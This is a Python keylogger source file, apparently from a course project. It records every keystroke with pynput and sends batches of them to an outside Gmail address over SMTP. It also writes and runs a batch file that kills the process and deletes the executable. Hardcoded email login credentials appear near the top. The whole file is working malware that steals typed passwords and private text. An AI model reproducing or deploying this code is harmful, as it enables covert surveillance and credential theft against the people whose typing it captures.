from pynput import keyboard
import time
import smtplib
from os import remove, path
import subprocess
from sys import argv
import threading
import Queue
destEmail = 'keylogsenderUIUC460@gmail.com'
dataBufferSize = 100
hackeremail = "keylogsenderUIUC460"
hackerpwd =  "qazwsxedcrfv"
local = False
exit_key = keyboard.Key.esc
end_program= False
data = ""
q = Queue.Queue()
holdDowns = ['Key.ctrl_l', 'Key.ctrl_r', 
			 'Key.shift', 'Key.shift_r',
			 'Key.alt_l', 'Key.alt_r']

def serverSetup():
	global hackeremail, hackerpwd
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(hackeremail, hackerpwd)
	return server

def send_data(msg):
	try:	
		if(local):
			print('sending data through LOG FILE')
			f.write('{0}'.format(msg))	
		else:
			print('sending data through EMAIL')
			server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, msg)
		print("sending complete")
	except Exception as e:
		print('Exception: ' + str(e))
	
def recordKey(key):
		global data
		try:
			data += str(key.char)
		except AttributeError:
			data += str(key)
		except Exception as e:
			print('Exception: '+str(e))
		finally:
			if(len(data) > dataBufferSize):
				q.put(data)
				data = ""

def on_press(key):
	print(key)
	recordKey(key)

def on_release(key):
	global data, end_program
	if(key == exit_key): #exit
		end_program = True
		return False
	try:
		if(str(key) in holdDowns):
			recordKey(key)
	except Exception as e:
		print('Exception: '+ str(e))

def run_keylogger():
	#collect events until released
	with keyboard.Listener(
			on_press=on_press,
			on_release=on_release
			) as listener:

		try:
			listener.join()
		except Exception as e:
			print('Exception: '+str(e))

def run_sender():
	if(local):
		f = open('keylog.txt', 'w')
		print("logging to file...")
	else:
		print("logging to email...")
		global server 
	server = serverSetup()
	
	while(end_program==False):
		try:
			msg = q.get(block = True, timeout = 10)				
		except:#queue empty 
			continue
		send_data(msg)

	if(local):
		f.close()
	else:
		server.quit()

def selfDelete():
	#create selfdelete file
	BATTXT = ("@ECHO OFF\n"
		  +"SETLOCAL\n"
		  +"TASKKILL /IM \"keylogger.exe\"\n"
		  +"DEL \""+argv[0]+"\"\n"
		  +"DEL \"%~f0\"") 
	d = open("del.bat", 'w')
	d.write(BATTXT)
	d.close()
	
	#run selfdelete file on exe, shell=True makes it run in background
	subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) 
def main():
	thread_keylogger = threading.Thread(target = run_keylogger)
	thread_sender = threading.Thread(target = run_sender)

	thread_keylogger.start()	
	thread_sender.start()	
	
	thread_keylogger.join()
	thread_sender.join()	
	if(argv[0][-2:]!="py"):#so we don't acidentally delete the python file when testing
		selfDelete()

if __name__== "__main__":
	main()
